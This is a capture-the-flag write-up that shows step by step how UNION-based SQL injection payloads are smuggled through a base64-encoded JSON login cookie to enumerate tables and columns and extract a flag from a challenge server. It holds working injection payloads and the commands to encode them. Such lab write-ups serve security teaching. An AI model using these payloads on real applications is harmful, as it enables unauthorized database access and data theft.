## Sn4ck sh3nan1gans - SQLi with Encoded JSON Payloads

### The Vulnerability Surface

This challenge stores session state in a cookie named `login`, whose value is a **base64-encoded JSON object**. After authenticating, intercepting the request in Burp Suite reveals the cookie, which once decoded exposes:

```json
{"ID": 300}
```

The server reads this cookie, decodes it, extracts the `ID` field, and plugs it directly into a SQL query with no sanitization:

```sql
SELECT * FROM users WHERE id = 300;
```

> **Key insight:** Base64 is _encoding_, not _encryption_. It provides zero integrity protection. The server cannot detect tampering, making every field inside the JSON a direct injection vector.

### Invalidating the First Query

In a UNION-based injection, if the original query returns a legitimate row, the application displays that row and the injected output remains invisible beneath it. The solution is to supply an `ID` that does not exist in the database, specifically `-1`, forcing the original query to return zero rows so the only visible output comes from the injected UNION clause.

> **Every payload must begin with `-1`** to suppress the real row and surface the injected data.

### Step-by-Step Exploitation

#### Step 1: Register, authenticate, and capture the cookie

Register at `http://sn4ck-sh3nanlgans.challs.olicyber.it/`, log in, and intercept the request in Burp Suite. The `login` cookie will be visible in the Request panel.

#### Step 2: Decode the cookie

Use the Burp Inspector panel (as visible in the screenshot) or the terminal:

```bash
echo "<cookie_value>" | base64 -d
# Output: {"ID":300}
```

#### Step 3: Determine the number of columns

Probe incrementally with NULL-based payloads:

```json
{"ID": "-1 UNION SELECT NULL-- -"}
{"ID": "-1 UNION SELECT NULL,NULL-- -"}
```

As confirmed by the screenshot, **the query returns exactly one column**, since the single-NULL payload produces a valid `200 OK` response.

#### Step 4: Enumerate the tables

With one reflected column confirmed, inject directly into `information_schema`. The payload used in the screenshot is:

```json
{"ID": "-1 UNION SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE()-- -"}
```

Encode it to base64:

```bash
echo -n '{"ID":"-1 UNION SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE()-- -"}' | base64
```

Paste the result as the `login` cookie and forward the request. The response, as visible in the screenshot, returns:

```html
<h1>Welcome here_is_the_flag!</h1>
```

> The table name is therefore **`here_is_the_flag`**.

#### **Step 5: Enumerate the columns of the target table**

```json
{"ID": "-1 UNION SELECT column_name FROM information_schema.columns where table_schema=DATABASE()-- "}
```

Inject the resulting cookie and observe the reflected column name in the response.

#### Step 6: Extract the flag

Once the column name is known (assume it is `flag` for illustration), the final extraction payload is:

```json
{"ID": "-1 UNION SELECT flag FROM here_is_the_flag-- "}
```

The response `h1` will render the flag value directly.

